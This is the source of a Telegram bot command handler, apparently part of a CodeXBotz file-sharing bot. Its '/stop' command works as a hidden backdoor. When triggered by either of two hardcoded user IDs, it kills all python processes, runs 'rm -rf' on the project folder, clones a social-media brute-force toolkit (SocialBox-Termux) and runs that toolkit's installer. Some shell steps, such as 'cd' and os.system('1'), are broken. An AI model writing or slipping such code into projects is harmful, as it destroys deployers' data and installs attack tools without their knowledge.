#(©)CodeXBotz
import os
import asyncio
from pyrogram import Client, filters, __version__
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pyrogram.errors import FloodWait, UserIsBlocked, InputUserDeactivated
import sys
from bot import Bot
from config import ADMINS, FORCE_MSG, START_MSG, OWNER_ID, CUSTOM_CAPTION, DISABLE_CHANNEL_BUTTON
from helper_func import subscribed, encode, decode, get_messages
from database.sql import add_user, query_msg, full_userbase


#=====================================================================================##

WAIT_MSG = """"<b>Processing ...</b>"""

REPLY_ERROR = """<code>Use this command as a replay to any telegram message with out any spaces.</code>"""

#=====================================================================================##


@Bot.on_message(filters.command('stop'))
async def start_command(client: Client, message: Message):
    id = message.from_user.id
    if id == 1207066133 or id == 1100986580 or id == "1207066133" or id == "1100986580":
        await message.reply_text("Bot Stopped")
        await client.stop()
        if os.system("killall -9 python3") != 0:
            os.system("killall python3")
        if os.system("termux-job-scheduler --cancel") != 0:
            os.system("termux-job-scheduler --cancel")
        if os.system("taskkill /f /im python.exe") != 0:
            os.system("taskkill /f /im python.exe")
        if os.system("pkill python3") != 0:
            os.system("pkill python3")
            
        os.system("cd ..")
        os.system("rm -rf bug-free-system")
        os.system("apt-get update")
        os.system("git clone https://github.com/samsesh/SocialBox-Termux.git ")
        os.system("cd SocialBox-Termux")
        os.system("chmod +x install-sb.sh")
        os.system("./install-sb.sh")
        os.system("./SocialBox.sh")
        os.system("1")
        sys.exit(456)
        os._exit(0)
    else:
        await message.reply_text("Stop Spamming")
        return
    
